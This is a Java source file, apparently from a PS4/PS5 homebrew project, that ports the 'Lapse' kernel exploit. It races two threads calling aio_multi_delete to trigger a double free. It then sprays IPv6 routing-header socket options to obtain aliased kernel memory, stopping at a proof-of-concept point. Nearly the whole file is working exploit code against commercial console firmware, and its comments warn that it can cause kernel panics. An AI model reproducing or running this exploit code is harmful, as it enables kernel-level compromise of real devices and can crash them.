// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2025 anonymous - Lapse
// Copyright (C) 2025 Kimari - Java port

package org.bdj.lapse;

/* Lapse is a kernel exploit for PS4 [5.00, 12.50) and PS5 [1.00-10.20) disclosed by an anonymous
 * developer ("abc") in 2025. Credit goes to abc for the proof-of-concept, Al-Azif for lapse.mjs,
 * and shahrilnet and znull_ptr for lapse.lua. BlueLapse primarily references the latter.
 *
 * https://www.psdevwiki.com/ps4/Vulnerabilities#FW_5.00-12.02_-_Double_free_due_to_aio_multi_delete()_improper_locking
 * https://github.com/shahrilnet/remote_lua_loader/blob/main/payloads/lapse.lua
 * https://github.com/Al-Azif/psfree-lapse/blob/main/src/lapse.mjs
 *
 * Any code in BlueLapse based on work from lapse.lua or lapse.mjs is available under the GNU Affero
 * General Public License. See the LICENSE file in the repository root for details.
 */

import org.bdj.UITextConsole;
import org.bdj.api.API;
import org.bdj.api.Buffer;
import org.bdj.lapse.LibKernel.PthreadBarrier;
import org.bdj.lapse.LibKernel.AioErrorArray;
import org.bdj.lapse.LibKernel.AioRWRequestArray;
import org.bdj.lapse.LibKernel.AioSubmitIdArray;
import org.bdj.lapse.LibKernel.Socket;
import org.bdj.lapse.Library.SystemCallFailed;

public class Lapse extends Thread {
	public final LibKernel k;
	public final API api;
	public final LibC c;
	public final UITextConsole console;

	public Lapse(LibKernel libkernel, UITextConsole console) {
		k = libkernel;
		api = k.api;
		c = k.libc;
		this.console = console;
	}

	public void run() {
		try {
			exploit();
		} catch (Throwable e) {
			console.add(e);
		} finally {
			cleanup();
		}
	}

	// Pinning seems to break the double-free part for me. I guess that cursed socket nonsense
	// lapse.lua does really is necessary. Hopefully NOT pinning doesn't cause any problems...
	// FIXME: I don't actually know if THIS is what breaks the exploit. Something definitely does.
	// public static final int CPU_CORE = 4;
	// public int initialCPUAffinity = 0;

	public static final int NUM_DOUBLE_FREE_TRIES = 20000;
	public static final int NUM_AIO_REQUESTS = 3;
	public static final int WHICH_REQUEST = NUM_AIO_REQUESTS - 1;

	// Note from lapse.lua: on game process, only < 130? sockets can be created
	public static final int NUM_SOCKETS = 64;     // NUM_SDS in lapse.lua
	public static final int NUM_SOCKETS_ALT = 48; // NUM_SDS_ALT in lapse.lua

	public static final int ALIAS_RTHDR_BUFSIZE = 0x80;
	public static final int NUM_RTHDR_ALIAS_TRIES = 100;

	// FIXME: Better naming once I figure out what these are actually used for?
	Socket[] sockets = new Socket[NUM_SOCKETS];
	Socket[] socketsAlt = new Socket[NUM_SOCKETS_ALT];

	AioSubmitIdArray ids = null; // should all be cancelled during cleanup

	private void exploit() throws Throwable {
		console.add("Lapse: setting things up");

		// Pin so that we only use one per-CPU bucket. Makes heap spraying/grooming easier.
		// initialCPUAffinity = k.cpuGetAffinityForCurrentThread();
		// k.cpuSetAffinityForCurrentThread(1 << CPU_CORE);

		AioRWRequestArray reqs = k.new AioRWRequestArray(NUM_AIO_REQUESTS);
		ids = k.new AioSubmitIdArray(NUM_AIO_REQUESTS);
		AioSubmitIdArray deleteIds = ids.slice(WHICH_REQUEST, 1);
		AioErrorArray mainErr = k.new AioErrorArray(1);
		AioErrorArray raceErr = k.new AioErrorArray(1);
		PthreadBarrier barrier = k.new PthreadBarrier(2);

		try {
			for (int i = 0; i < sockets.length; i++) {
				sockets[i] = k.new Socket(LibKernel.AF_INET6, LibKernel.SOCK_DGRAM, LibKernel.IPPROTO_UDP);
			}
			for (int i = 0; i < socketsAlt.length; i++) {
				socketsAlt[i] = k.new Socket(LibKernel.AF_INET6, LibKernel.SOCK_DGRAM, LibKernel.IPPROTO_UDP);
			}
		} catch (SystemCallFailed e) {
			console.add(e);
			console.add("This usually means you have to close the application and try again.");
			return;
		}

		// Just keep track of address for this, Buffer wrapper gets in the way
		// NOTE: We leak this but it probably doesn't matter. Or ought to be leaked anyway?
		long aliasRthdrBufAddr = 0;

		// Bare minimum initialization to succeed in calling aio_submit_cmd()
		for (int i = 0; i < NUM_AIO_REQUESTS; i++) {
			reqs.get(i).fd.set(-1);
		}

		console.add("Lapse: starting double-free attempts");

		boolean success = false;
		for (int i = 0; i < NUM_DOUBLE_FREE_TRIES; i++) {
			try {
				// Issue requests and get back submission IDs to use later
				// Command and priority do not matter but the MULTI flag is required
				k.aioSubmitCmd(LibKernel.AIO_CMD_MULTI_WRITE, reqs, ids);
			} catch (SystemCallFailed e) {
				console.add(e);
				console.add("This usually means you have to close the application and try again.");
				return;
			}

			// You cannot delete any request that is already being processed by a
			// SceFsstAIO worker thread.
			// We just wait on all of them instead of polling and checking whether
			// a request is being processed. Polling is also error-prone since the
			// result can become out of date.
			k.aioMultiWait(ids, null, LibKernel.AIO_WAIT_AND);

			RaceThread racer = new RaceThread(barrier, deleteIds, raceErr);
			racer.start();

			// Sync point between threads
			barrier.barrierWait();

			// Hopefully both threads will call aio_multi_delete at the same time
			// PANIC: This call will make the system vulnerable to a kernel panic:
			// Double free on the 0x80 malloc zone. Important kernel data may alias.
			k.aioMultiDelete(deleteIds, mainErr);

			// Wait for race thread to finish
			racer.join();

			// RESTORE: This code will reserve the double freed memory (see PANIC above).
			// FIXME: Is this actually the case or am I totally misunderstanding?
			aliasRthdrBufAddr = api.malloc(ALIAS_RTHDR_BUFSIZE);

			// Read errors. The race is successful if they are both zero.
			int m = mainErr.get(0).id.get();
			int r = raceErr.get(0).id.get();
			if (m == 0 && r == 0) {
				console.add("Lapse: attempt " + i + ": double free achieved!");
				console.add("-> errors: 0x" + Integer.toHexString(m) + " 0x" + Integer.toHexString(r));
				console.add("-> rthdr buffer: 0x" + Long.toHexString(aliasRthdrBufAddr));
				success = true;
				break;
			}

			// Touching the console here may or may not screw with the timing?
			// console.add("Lapse: attempt " + i + ": failed, alloc'd 0x" + Long.toHexString(buf));
			// console.add("-> errors: 0x" + Integer.toHexString(m) + " 0x" + Integer.toHexString(r));
		}

		if (!success) {
			console.add("Lapse: couldn't achieve double free in " + NUM_DOUBLE_FREE_TRIES + " tries");
			return;
		}

		// Continue with make_aliased_rthdrs from lapse.lua/mjs
		// RESTORE: This will fill the double freed memory with harmless data (see PANIC above).

		Buffer aliasRthdrBuf = new Buffer(aliasRthdrBufAddr, ALIAS_RTHDR_BUFSIZE);
		int markerOffset = 4; // into aliasRthdrBuf, used to check if we've successfully aliased?

		int ip6rLen = ((ALIAS_RTHDR_BUFSIZE >> 3) - 1) & (~1);
		int rthdrLen = (ip6rLen + 1) << 3; // rsize in lapse
		Buffer aliasRthdrBufAdjLen = new Buffer(aliasRthdrBufAddr, rthdrLen);

		// IPV6_RTHDR (routing header?) options struct for setsockopt
		aliasRthdrBuf.putByte(0, (byte)0);              // ip6r_nxt
		aliasRthdrBuf.putByte(1, (byte)ip6rLen);        // ip6r_len
		aliasRthdrBuf.putByte(2, (byte)0);              // ip6r_type
		aliasRthdrBuf.putByte(3, (byte)(ip6rLen >> 1)); // ip6r_segleft

		Socket[] aliasSocketPair = new Socket[2];
		boolean aliasSocketPairFound = false;

		for (int iTry = 0; iTry < NUM_RTHDR_ALIAS_TRIES; iTry++) {
			for (int iSocket = 0; iSocket < NUM_SOCKETS; iSocket++) {
				aliasRthdrBuf.putInt(markerOffset, iSocket + 1);
				// Does setsockopt actually need to be called with rthdrLen?
				sockets[iSocket].setOption(LibKernel.IPPROTO_IPV6, LibKernel.IPV6_RTHDR, aliasRthdrBufAdjLen);
			}
			for (int iSocket = 0; iSocket < NUM_SOCKETS; iSocket++) {
				// Why pass the full length here but not for setsockopt in 1st loop? Does it matter?
				sockets[iSocket].getOption(LibKernel.IPPROTO_IPV6, LibKernel.IPV6_RTHDR, aliasRthdrBuf);
				int marker = aliasRthdrBuf.getInt(markerOffset);
				if (marker != iSocket) {
					// Save aliased socket pair
					aliasSocketPair[0] = sockets[iSocket];
					aliasSocketPair[1] = sockets[marker];
					// Replace them with new ones in the sockets array
					sockets[iSocket] = k.new Socket(LibKernel.AF_INET6, LibKernel.SOCK_DGRAM, LibKernel.IPPROTO_UDP);
					sockets[marker]  = k.new Socket(LibKernel.AF_INET6, LibKernel.SOCK_DGRAM, LibKernel.IPPROTO_UDP);
					int fd0 = aliasSocketPair[0].fd, fd1 = aliasSocketPair[1].fd;
					console.add("-> aliased rthdrs on attempt " + iTry + ", pair: " + fd0 + ", " + fd1);
					aliasSocketPairFound = true;
					break;
				}
			}
			// Clear routing headers for everything other than the aliased pair
			for (int iSocket = 0; iSocket < NUM_SOCKETS; iSocket++) {
				Socket socket = sockets[iSocket];
				socket.setOption(LibKernel.IPPROTO_IPV6, LibKernel.IPV6_RTHDR, new Buffer(0, 0));
			}
			if (aliasSocketPairFound) {
				break;
			}
		}

		if (!aliasSocketPairFound) {
			console.add("Lapse: couldn't make aliased rthdrs in " + NUM_RTHDR_ALIAS_TRIES + " tries");
			return;
		}

		console.add("Lapse: end of PoC");
	}

	private class RaceThread extends Thread {
		private PthreadBarrier barrier;
		private AioSubmitIdArray ids;
		private AioErrorArray errors;

		public RaceThread(PthreadBarrier barrier, AioSubmitIdArray ids, AioErrorArray errors) {
			this.barrier = barrier;
			this.ids = ids;
			this.errors = errors;
		}

		public void run() {
			// Not sure if this is a good idea but whatever
			// k.cpuSetAffinityForCurrentThread(1 << CPU_CORE);

			// Sync point between threads
			barrier.barrierWait();

			// Hopefully both threads will call aio_multi_delete at the same time
			k.aioMultiDelete(ids, errors);
		}
	}

	private void cleanup() {
		// k.cpuSetAffinityForCurrentThread(initialCPUAffinity);
		for (int i = 0; i < sockets.length;    i++) sockets   [i].close();
		for (int i = 0; i < socketsAlt.length; i++) socketsAlt[i].close();
		k.aioMultiCancel(ids, null);
	}
}
